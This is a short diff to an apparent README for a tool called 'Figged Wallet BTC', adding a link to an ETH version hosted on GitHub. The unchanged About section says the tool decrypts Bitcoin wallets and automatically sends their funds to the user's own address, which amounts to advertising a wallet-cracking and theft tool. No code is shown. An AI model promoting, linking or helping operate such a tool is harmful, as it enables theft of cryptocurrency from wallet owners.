@@ -15,6 +15,10 @@
 - [x] Kali Linux
 - [x] Ubuntu 20.04
 
+## ETH Version
+
+and for the ETH version [Click Here](https://github.com/AeX03/ELYS-Figget-Wallet)
+
 ## About
 * Figged Wallet BTC What's the point?
 * Figged is used to decrypt btc wallets to automatically send them to your btc address!
